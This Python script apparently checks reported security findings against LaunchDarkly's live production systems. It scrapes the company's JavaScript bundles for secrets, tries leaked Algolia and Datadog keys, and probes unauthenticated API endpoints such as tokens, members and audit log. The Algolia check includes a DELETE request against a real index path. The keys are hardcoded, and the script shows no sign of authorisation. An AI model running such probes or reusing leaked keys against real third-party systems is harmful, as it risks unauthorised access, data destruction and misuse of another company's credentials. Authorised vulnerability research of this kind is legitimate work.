#!/usr/bin/env python3
"""Quick verification of LaunchDarkly findings."""
import requests
import re
import sys
import os
os.environ["PYTHONIOENCODING"] = "utf-8"
try: sys.stdout.reconfigure(encoding="utf-8")
except: pass

def main():
    print("=" * 60)
    print("LAUNCHDARKLY FINDING VERIFICATION")
    print("=" * 60)

    # Test 1: Verify the team-o11y secret
    print("\n[1] Hardcoded Secret in bootstrap.js")
    print("-" * 40)
    try:
        r = requests.get("https://static.launchdarkly.com/app/s/ld/bootstrap.3cd94b3eba31dc6a.js", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            if "team-o11y" in r.text:
                idx = r.text.index("team-o11y")
                snippet = r.text[max(0, idx-80):idx+80]
                print(f"  CONFIRMED: team-o11y secret found")
                print(f"  Context: ...{snippet}...")
            else:
                print("  NOT FOUND in this exact file (hash may have changed)")
                # Search for any interesting strings
                interesting = []
                for pattern in ["datadog", "sentry", "bugsnag", "newrelic", "o11y", "monitoring"]:
                    if pattern in r.text.lower():
                        interesting.append(pattern)
                if interesting:
                    print(f"  Related keywords found: {interesting}")
        else:
            print(f"  HTTP {r.status_code} - file may have been rotated")
    except Exception as e:
        print(f"  Error: {e}")

    # Test 2: Check the vendor JS for secrets
    print("\n[2] Secrets in vendor JS")
    print("-" * 40)
    try:
        r = requests.get("https://static.launchdarkly.com/app/s/ld/initial.vendor.69a51a7e57c18e60.js", timeout=10)
        if r.status_code == 200:
            # Look for API keys, tokens, secrets
            for keyword in ["api_key", "apiKey", "secret", "token", "password", "private_key"]:
                if keyword in r.text:
                    idx = r.text.index(keyword)
                    snippet = r.text[max(0, idx-40):idx+60].replace("\n", " ")
                    print(f"  Found '{keyword}': ...{snippet}...")
        else:
            print(f"  HTTP {r.status_code}")
    except Exception as e:
        print(f"  Error: {e}")

    # Test 3: DOM XSS on app.launchdarkly.com
    print("\n[3] DOM XSS Check on app.launchdarkly.com")
    print("-" * 40)
    try:
        r = requests.get("https://app.launchdarkly.com", timeout=10)
        print(f"  Redirected to: {r.url}")
        has_innerhtml = ".innerHTML" in r.text
        has_hash = "location.hash" in r.text
        has_href = "location.href" in r.text
        print(f"  .innerHTML in source: {has_innerhtml}")
        print(f"  location.hash in source: {has_hash}")
        print(f"  location.href in source: {has_href}")
        
        # Find JS files to check
        js_files = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
        print(f"  External JS files found: {len(js_files)}")
        if js_files:
            for jf in js_files[:3]:
                print(f"    - {jf[:80]}")
    except Exception as e:
        print(f"  Error: {e}")

    # Test 4: Algolia key permission check
    print("\n[4] Algolia API Key Permission Check")
    print("-" * 40)
    try:
        algolia_key = "MzY3ZmZkMTFlNjczOWI5ZGZiNzY5MjgyMjJkZjZmMWI5MTlmODFhYTc0NmRhM2MyM2I3MTNkODJmNWRlNWJlZGZpbHRlcnM9ZG9tYWluJTNBbGF1bmNoZGFya2x5LmNvbSUyMEFORCUyMGF1dGhlZCUzQWZhbHNlJTIwQU5EJTIwTk9UJTIwdHlwZSUzQW5hdmlnYXRpb24mcmVzdHJpY3RJbmRpY2VzPWZlcm5fZG9jc19zZWFyY2gmdmFsaWRVbnRpbD0xNzg0NzQ0NDQ3"
        headers = {
            "X-Algolia-Application-Id": "P6VYURBGG0",
            "X-Algolia-API-Key": algolia_key
        }
        # Try listing indexes (admin)
        r = requests.get("https://P6VYURBGG0.algolia.net/1/indexes", headers=headers, timeout=5)
        print(f"  List indexes: HTTP {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            items = data.get("items", [])
            print(f"  OVERPERMISSIONED: Can list {len(items)} indexes!")
            for item in items[:5]:
                print(f"    - {item.get('name', 'unknown')}")
        elif r.status_code == 403:
            print("  Properly scoped (search-only, cannot list)")
        
        # Try delete (should fail)
        r2 = requests.delete("https://P6VYURBGG0.algolia.net/1/indexes/test_delete", headers=headers, timeout=5)
        print(f"  Delete index: HTTP {r2.status_code}")
        if r2.status_code == 200:
            print("  CRITICAL: Can delete indexes!")
        else:
            print("  Cannot delete (expected)")
    except Exception as e:
        print(f"  Error: {e}")

    # Test 5: Datadog RUM key check
    print("\n[5] Datadog RUM API Key Check")
    print("-" * 40)
    dd_keys = [
        "pub0a56c57f256ac77b8fbc94e54c2577d8",  # app
        "pubdb18698b944ba23ebdd332be633fb7a3",  # docs
    ]
    for key in dd_keys:
        try:
            # Try to query logs (should fail for RUM-only keys)
            r = requests.get(
                f"https://api.datadoghq.com/api/v1/logs?api_key={key}",
                timeout=5
            )
            print(f"  Key {key[:12]}...: Logs API -> HTTP {r.status_code}")
        except Exception as e:
            print(f"  Key {key[:12]}...: {e}")

    # Test 6: Check /internal/ on app
    print("\n[6] /internal/ Endpoint on app.launchdarkly.com")
    print("-" * 40)
    try:
        r = requests.get("https://app.launchdarkly.com/internal/", timeout=5, allow_redirects=False)
        print(f"  Status: {r.status_code}")
        ct = r.headers.get("Content-Type", "N/A")
        print(f"  Content-Type: {ct}")
        if r.status_code == 200:
            preview = r.text[:300].replace("\n", " ")
            print(f"  Body: {preview}")
    except Exception as e:
        print(f"  Error: {e}")

    # Test 7: API v2 unauthenticated access
    print("\n[7] API v2 Unauthenticated Access")
    print("-" * 40)
    endpoints = [
        "/api/v2/caller-identity",
        "/api/v2/flags",
        "/api/v2/projects",
        "/api/v2/members",
        "/api/v2/tokens",
        "/api/v2/auditlog",
    ]
    for ep in endpoints:
        try:
            r = requests.get(f"https://app.launchdarkly.com{ep}", timeout=5)
            status_emoji = "OPEN" if r.status_code == 200 else "locked"
            print(f"  {ep}: HTTP {r.status_code} ({status_emoji})")
            if r.status_code == 200 and "json" in r.headers.get("Content-Type", ""):
                preview = r.text[:100]
                print(f"    -> {preview}")
        except Exception as e:
            print(f"  {ep}: error")

    print("\n" + "=" * 60)
    print("VERIFICATION COMPLETE")
    print("=" * 60)


if __name__ == "__main__":
    main()
